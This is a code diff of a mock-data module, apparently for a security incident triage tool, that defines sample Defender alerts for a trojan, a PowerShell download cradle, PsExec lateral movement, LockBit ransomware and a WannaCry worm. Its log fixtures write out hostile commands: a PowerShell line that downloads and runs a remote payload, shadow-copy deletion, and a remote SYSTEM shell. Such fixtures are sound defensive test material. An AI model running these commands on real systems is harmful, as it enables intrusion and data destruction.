@@ -10,39 +10,61 @@ from models import (
 )
 
 
+MOCK_TENANT_ID = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+
 INCIDENTS = [
     # --- Malicious Executable ---
     Incident(
-        id="1234-ABCD-5678-EFGH",
+        id="da637431751965614873_-1139290728",
+        mde_alert_id="da637431751965614873_-1139290728",
+        mde_incident_id="521",
+        tenant_id=MOCK_TENANT_ID,
         title="Malicious Executable Detected on Finance Workstation",
-        detection_timestamp="2026-02-11 14:32:18 UTC",
+        description=(
+            "A malicious executable was detected on this device. The file matched the signature "
+            "Trojan:Win32/Loader.ABCIml and attempted to establish an outbound connection to a "
+            "known command-and-control IP address. The file was successfully quarantined."
+        ),
+        detection_timestamp="2026-02-11T14:32:18Z",
         severity="HIGH",
         device_name="FIN-WS-027",
         user="ola.nordmann@company.com",
         file_name="supersusmalware.exe",
         file_hash="fb55414848281f804858ce188c3dc659d129e283bd62d58d34f6e6f568feab37",
         microsoft_signature="Trojan:Win32/Loader.ABCIml",
-        quarantine_status="Successful",
+        quarantine_status="Quarantined",
         log_source="Microsoft Defender for Endpoint",
         source_ip="10.14.2.27",
         destination_ip="185.220.101.34",
-        status="Open",
+        status="New",
         command_line="supersusmalware.exe",
         file_path="C:\\Users\\ola\\Downloads\\supersusmalware.exe",
+        mitre_techniques_json=json.dumps([
+            "T1204.002", "T1566.001", "T1071.001", "T1055",
+        ]),
         logs_json=json.dumps([
-            "Feb 11 14:31:02 FIN-WS-027 defender[1201]: File supersusmalware.exe written to C:\\Users\\ola\\Downloads\\",
-            "Feb 11 14:31:04 FIN-WS-027 defender[1201]: Hash match: 9f2c6a9d...5a4 flagged Trojan:Win32/Loader.ABCIml",
-            "Feb 11 14:31:05 FIN-WS-027 defender[1201]: Process supersusmalware.exe (PID 8832) attempted execution",
-            "Feb 11 14:31:05 FIN-WS-027 defender[1201]: Outbound connection 10.14.2.27 -> 185.220.101.34:443 blocked",
-            "Feb 11 14:31:06 FIN-WS-027 defender[1201]: File quarantined successfully",
-            "Feb 11 14:32:18 FIN-WS-027 defender[1201]: Alert generated - severity HIGH",
+            "2026-02-11T14:31:02Z [HIGH] FIN-WS-027 defender[1201]: File supersusmalware.exe written to C:\\Users\\ola\\Downloads\\",
+            "2026-02-11T14:31:04Z [HIGH] FIN-WS-027 defender[1201]: Hash match flagged Trojan:Win32/Loader.ABCIml",
+            "2026-02-11T14:31:05Z [HIGH] FIN-WS-027 defender[1201]: Process supersusmalware.exe (PID 8832) attempted execution",
+            "2026-02-11T14:31:05Z [HIGH] FIN-WS-027 defender[1201]: Outbound connection 10.14.2.27 -> 185.220.101.34:443 blocked",
+            "2026-02-11T14:31:06Z [HIGH] FIN-WS-027 defender[1201]: File quarantined successfully",
+            "2026-02-11T14:32:18Z [HIGH] FIN-WS-027 defender[1201]: Alert generated - severity HIGH",
         ]),
     ),
     # --- PowerShell Download Cradle ---
     Incident(
-        id="9012-QRST-3456-UVWX",
+        id="da637455821043574621_1963810148",
+        mde_alert_id="da637455821043574621_1963810148",
+        mde_incident_id="522",
+        tenant_id=MOCK_TENANT_ID,
         title="Suspicious PowerShell Download Cradle",
-        detection_timestamp="2026-02-13 09:15:42 UTC",
+        description=(
+            "A PowerShell script was executed using a download cradle to fetch and run a remote "
+            "payload, bypassing the local execution policy. The script established an outbound "
+            "connection to an external IP address. Quarantine failed because the process was "
+            "still active at time of detection."
+        ),
+        detection_timestamp="2026-02-13T09:15:42Z",
         severity="CRITICAL",
         device_name="HR-LAPTOP-011",
         user="kari.hansen@company.com",
@@ -53,24 +75,36 @@ INCIDENTS = [
         log_source="Microsoft Defender for Endpoint",
         source_ip="10.14.3.11",
         destination_ip="91.215.85.142",
-        status="Open",
+        status="New",
         command_line="powershell.exe -ExecutionPolicy Bypass -File update_check.ps1",
         file_path="C:\\Users\\kari\\AppData\\Local\\Temp\\update_check.ps1",
+        mitre_techniques_json=json.dumps([
+            "T1059.001", "T1105", "T1204.002", "T1566.001",
+        ]),
         logs_json=json.dumps([
-            "Feb 13 09:14:30 HR-LAPTOP-011 outlook[3201]: Attachment saved: update_check.ps1",
-            "Feb 13 09:15:01 HR-LAPTOP-011 powershell[5504]: Script execution: update_check.ps1",
-            "Feb 13 09:15:02 HR-LAPTOP-011 powershell[5504]: IEX (New-Object Net.WebClient).DownloadString('http://91.215.85.142/payload')",
-            "Feb 13 09:15:03 HR-LAPTOP-011 defender[1201]: Behavior:Win32/SuspPowerShell.B detected",
-            "Feb 13 09:15:05 HR-LAPTOP-011 powershell[5504]: Connection established to 91.215.85.142:80",
-            "Feb 13 09:15:10 HR-LAPTOP-011 defender[1201]: Quarantine FAILED - process 5504 still running",
-            "Feb 13 09:15:42 HR-LAPTOP-011 defender[1201]: Alert generated - severity CRITICAL",
+            "2026-02-13T09:14:30Z [CRITICAL] HR-LAPTOP-011 outlook[3201]: Attachment saved: update_check.ps1",
+            "2026-02-13T09:15:01Z [CRITICAL] HR-LAPTOP-011 powershell[5504]: Script execution: update_check.ps1",
+            "2026-02-13T09:15:02Z [CRITICAL] HR-LAPTOP-011 powershell[5504]: IEX (New-Object Net.WebClient).DownloadString('http://91.215.85.142/payload')",
+            "2026-02-13T09:15:03Z [CRITICAL] HR-LAPTOP-011 defender[1201]: Behavior:Win32/SuspPowerShell.B detected",
+            "2026-02-13T09:15:05Z [CRITICAL] HR-LAPTOP-011 powershell[5504]: Connection established to 91.215.85.142:80",
+            "2026-02-13T09:15:10Z [CRITICAL] HR-LAPTOP-011 defender[1201]: Quarantine FAILED - process 5504 still running",
+            "2026-02-13T09:15:42Z [CRITICAL] HR-LAPTOP-011 defender[1201]: Alert generated - severity CRITICAL",
         ]),
     ),
     # --- Lateral Movement via PsExec ---
     Incident(
-        id="3456-JKLM-7890-NOPQ",
+        id="da637459312876540129_-847563021",
+        mde_alert_id="da637459312876540129_-847563021",
+        mde_incident_id="522",
+        tenant_id=MOCK_TENANT_ID,
         title="Lateral Movement via PsExec",
-        detection_timestamp="2026-02-13 16:48:33 UTC",
+        description=(
+            "PsExec was used to remotely execute commands on multiple hosts using valid "
+            "administrative credentials. A SYSTEM-level shell was opened on a remote device "
+            "and the tool was subsequently used to move to additional hosts, indicating "
+            "active lateral movement within the network."
+        ),
+        detection_timestamp="2026-02-13T16:48:33Z",
         severity="CRITICAL",
         device_name="IT-ADMIN-004",
         user="admin.svc@company.com",
@@ -81,51 +115,75 @@ INCIDENTS = [
         log_source="Microsoft Defender for Endpoint",
         source_ip="10.14.1.4",
         destination_ip="10.14.2.27",
-        status="Investigating",
+        status="InProgress",
         command_line="psexec.exe \\\\FIN-WS-027 -s cmd.exe",
         file_path="C:\\Windows\\Temp\\psexec.exe",
+        mitre_techniques_json=json.dumps([
+            "T1021.002", "T1570", "T1543.003", "T1078",
+        ]),
         logs_json=json.dumps([
-            "Feb 13 16:45:01 IT-ADMIN-004 psexec[7201]: Remote execution initiated to FIN-WS-027 (10.14.2.27)",
-            "Feb 13 16:45:02 IT-ADMIN-004 psexec[7201]: Service PSEXESVC installed on FIN-WS-027",
-            "Feb 13 16:45:03 IT-ADMIN-004 psexec[7201]: Process cmd.exe started on FIN-WS-027 as SYSTEM",
-            "Feb 13 16:46:15 IT-ADMIN-004 defender[1201]: HackTool:Win32/PsExec detected",
-            "Feb 13 16:47:00 IT-ADMIN-004 psexec[7201]: Remote execution to HR-LAPTOP-011 (10.14.3.11)",
-            "Feb 13 16:48:33 IT-ADMIN-004 defender[1201]: Alert generated - severity CRITICAL",
+            "2026-02-13T16:45:01Z [CRITICAL] IT-ADMIN-004 psexec[7201]: Remote execution initiated to FIN-WS-027 (10.14.2.27)",
+            "2026-02-13T16:45:02Z [CRITICAL] IT-ADMIN-004 psexec[7201]: Service PSEXESVC installed on FIN-WS-027",
+            "2026-02-13T16:45:03Z [CRITICAL] IT-ADMIN-004 psexec[7201]: Process cmd.exe started on FIN-WS-027 as SYSTEM",
+            "2026-02-13T16:46:15Z [CRITICAL] IT-ADMIN-004 defender[1201]: HackTool:Win32/PsExec detected",
+            "2026-02-13T16:47:00Z [CRITICAL] IT-ADMIN-004 psexec[7201]: Remote execution to HR-LAPTOP-011 (10.14.3.11)",
+            "2026-02-13T16:48:33Z [CRITICAL] IT-ADMIN-004 defender[1201]: Alert generated - severity CRITICAL",
         ]),
     ),
     # --- Ransomware ---
     Incident(
-        id="6543-RANS-0001-WXYZ",
+        id="da637479102983651840_2047812903",
+        mde_alert_id="da637479102983651840_2047812903",
+        mde_incident_id="530",
+        tenant_id=MOCK_TENANT_ID,
         title="Ransomware File Encryption Detected on File Server",
-        detection_timestamp="2026-02-15 02:14:33 UTC",
+        description=(
+            "Ransomware was detected actively encrypting files on the file server. The malware "
+            "deleted all VSS shadow copies to prevent recovery, applied .lockbit extensions to "
+            "thousands of files, and dropped ransom notes across multiple directories. "
+            "Quarantine failed due to ongoing mass file I/O operations."
+        ),
+        detection_timestamp="2026-02-15T02:14:33Z",
         severity="CRITICAL",
         device_name="FILE-SRV-002",
         user="svc.backup@company.com",
         file_name="winupdate32.exe",
-        file_hash="c7f3a2e8b1d4f65a9c2eb8d1f4a7c0e3b6d9f2a5c8e1b4d7f0a3c6e9b2d5f8a1",
+        file_hash="08039481f17de1a125763d6dadc9a91615fa027ad42a4f42d886b94063a94822",
         microsoft_signature="Ransom:Win32/LockBit.A",
         quarantine_status="Failed - Mass File Operations In Progress",
         log_source="Microsoft Defender for Endpoint",
         source_ip="10.14.4.2",
         destination_ip="10.14.4.10",
-        status="Open",
+        status="New",
         command_line="winupdate32.exe",
         file_path="C:\\Windows\\Temp\\winupdate32.exe",
+        mitre_techniques_json=json.dumps([
+            "T1486", "T1490", "T1083", "T1489", "T1036.005",
+        ]),
         logs_json=json.dumps([
-            "Feb 15 02:10:01 FILE-SRV-002 defender[1201]: winupdate32.exe written to C:\\Windows\\Temp\\",
-            "Feb 15 02:10:05 FILE-SRV-002 defender[1201]: Process winupdate32.exe (PID 9244) started as SYSTEM",
-            "Feb 15 02:11:00 FILE-SRV-002 defender[1201]: Mass file rename detected - .lockbit extensions applied to 2,847 files",
-            "Feb 15 02:11:05 FILE-SRV-002 cmd[9250]: vssadmin.exe delete shadows /all /quiet - shadow copies deleted",
-            "Feb 15 02:11:10 FILE-SRV-002 defender[1201]: Ransom note LOCKBIT-README.txt dropped in 47 directories",
-            "Feb 15 02:12:00 FILE-SRV-002 defender[1201]: Quarantine FAILED - mass file I/O in progress",
-            "Feb 15 02:14:33 FILE-SRV-002 defender[1201]: Alert generated - severity CRITICAL",
+            "2026-02-15T02:10:01Z [CRITICAL] FILE-SRV-002 defender[1201]: winupdate32.exe written to C:\\Windows\\Temp\\",
+            "2026-02-15T02:10:05Z [CRITICAL] FILE-SRV-002 defender[1201]: Process winupdate32.exe (PID 9244) started as SYSTEM",
+            "2026-02-15T02:11:00Z [CRITICAL] FILE-SRV-002 defender[1201]: Mass file rename detected - .lockbit extensions applied to 2,847 files",
+            "2026-02-15T02:11:05Z [CRITICAL] FILE-SRV-002 cmd[9250]: vssadmin.exe delete shadows /all /quiet",
+            "2026-02-15T02:11:10Z [CRITICAL] FILE-SRV-002 defender[1201]: Ransom note LOCKBIT-README.txt dropped in 47 directories",
+            "2026-02-15T02:12:00Z [CRITICAL] FILE-SRV-002 defender[1201]: Quarantine FAILED - mass file I/O in progress",
+            "2026-02-15T02:14:33Z [CRITICAL] FILE-SRV-002 defender[1201]: Alert generated - severity CRITICAL",
         ]),
     ),
     # --- Network Worm ---
     Incident(
-        id="8901-WORM-0003-EFGH",
+        id="da637489204719384756_-391048203",
+        mde_alert_id="da637489204719384756_-391048203",
+        mde_incident_id="531",
+        tenant_id=MOCK_TENANT_ID,
         title="Network Worm Propagation via SMB Exploit",
-        detection_timestamp="2026-02-16 07:03:18 UTC",
+        description=(
+            "A worm exploiting the EternalBlue vulnerability (CVE-2017-0144) was detected "
+            "actively propagating across the local subnet via SMB port 445. After initial "
+            "compromise, the malware dropped a copy of itself and began scanning and exploiting "
+            "additional hosts. Quarantine failed due to active lateral spread."
+        ),
+        detection_timestamp="2026-02-16T07:03:18Z",
         severity="CRITICAL",
         device_name="DEV-WS-015",
         user="dev.user@company.com",
@@ -136,17 +194,20 @@ INCIDENTS = [
         log_source="Microsoft Defender for Endpoint",
         source_ip="10.14.6.15",
         destination_ip="10.14.6.0/24",
-        status="Open",
+        status="New",
         command_line="mssecsvc.exe -m security",
-        file_path="C:\\Windows\\mssecsvc.exe",
+        file_path="D:\\Windows\\mssecsvc.exe",
+        mitre_techniques_json=json.dumps([
+            "T1210", "T1570", "T1486", "T1018",
+        ]),
         logs_json=json.dumps([
-            "Feb 16 07:00:01 DEV-WS-015 defender[1201]: Inbound SMB exploit attempt detected from 10.14.6.42",
-            "Feb 16 07:00:04 DEV-WS-015 defender[1201]: EternalBlue exploit triggered - CVE-2017-0144",
-            "Feb 16 07:00:06 DEV-WS-015 defender[1201]: mssecsvc.exe (PID 7801) dropped to C:\\Windows\\",
-            "Feb 16 07:00:10 DEV-WS-015 defender[1201]: Worm:Win32/WannaCrypt.A identified",
-            "Feb 16 07:01:00 DEV-WS-015 defender[1201]: Port scan initiated - 10.14.6.15 scanning 445/tcp across /24 subnet",
-            "Feb 16 07:01:30 DEV-WS-015 defender[1201]: SMB exploit propagation attempts to 12 hosts on subnet",
-            "Feb 16 07:03:18 DEV-WS-015 defender[1201]: Alert generated - severity CRITICAL",
+            "2026-02-16T07:00:01Z [CRITICAL] DEV-WS-015 defender[1201]: Inbound SMB exploit attempt detected from 10.14.6.42",
+            "2026-02-16T07:00:04Z [CRITICAL] DEV-WS-015 defender[1201]: EternalBlue exploit triggered - CVE-2017-0144",
+            "2026-02-16T07:00:06Z [CRITICAL] DEV-WS-015 defender[1201]: mssecsvc.exe (PID 7801) dropped to D:\\Windows\\",
+            "2026-02-16T07:00:10Z [CRITICAL] DEV-WS-015 defender[1201]: Worm:Win32/WannaCrypt.A identified",
+            "2026-02-16T07:01:00Z [CRITICAL] DEV-WS-015 defender[1201]: Port scan initiated - 10.14.6.15 scanning 445/tcp across /24 subnet",
+            "2026-02-16T07:01:30Z [CRITICAL] DEV-WS-015 defender[1201]: SMB exploit propagation attempts to 12 hosts on subnet",
+            "2026-02-16T07:03:18Z [CRITICAL] DEV-WS-015 defender[1201]: Alert generated - severity CRITICAL",
         ]),
     ),
 ]
@@ -230,7 +291,7 @@ FILE_INTELLIGENCE = [
     ),
     # --- Ransomware ---
     FileIntelligence(
-        file_hash="c7f3a2e8b1d4f65a9c2eb8d1f4a7c0e3b6d9f2a5c8e1b4d7f0a3c6e9b2d5f8a1",
+        file_hash="08039481f17de1a125763d6dadc9a91615fa027ad42a4f42d886b94063a94822",
         ms_classification="Malicious",
         ms_threat_family="Ransom:Win32/LockBit.A",
         ms_prevalence="High",
@@ -457,13 +518,6 @@ CAMPAIGN_CONTEXTS = [
             "9f2c6a9d4c1e5b3a8f7e2d9c6a4b3e1f0c8d7a6b5e4c3f2d1a0b9c8d7e6f5a4",
             "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
             "c7f3a2e8b1d4f65a9c2eb8d1f4a7c0e3b6d9f2a5c8e1b4d7f0a3c6e9b2d5f8a1",
-        ]),
-        related_ips_json=json.dumps([
-            "185.220.101.34",
-            "91.215.85.142",
-        ]),
-        related_techniques_json=json.dumps([
-            "T1059", "T1059.001", "T1570", "T1486", "T1543.003", "T1210", "T1555.003",
         ]),
     ),
 ]
